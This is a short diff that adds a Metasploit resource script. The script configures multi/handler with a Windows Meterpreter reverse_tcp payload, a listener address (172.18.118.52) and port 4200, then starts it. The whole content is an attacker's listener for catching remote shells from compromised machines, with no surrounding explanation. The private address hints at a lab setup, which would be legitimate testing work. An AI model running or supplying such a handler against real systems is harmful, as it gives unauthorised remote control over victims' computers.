@@ -1,0 +1,5 @@
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost 172.18.118.52
+set lport 4200
+exploit
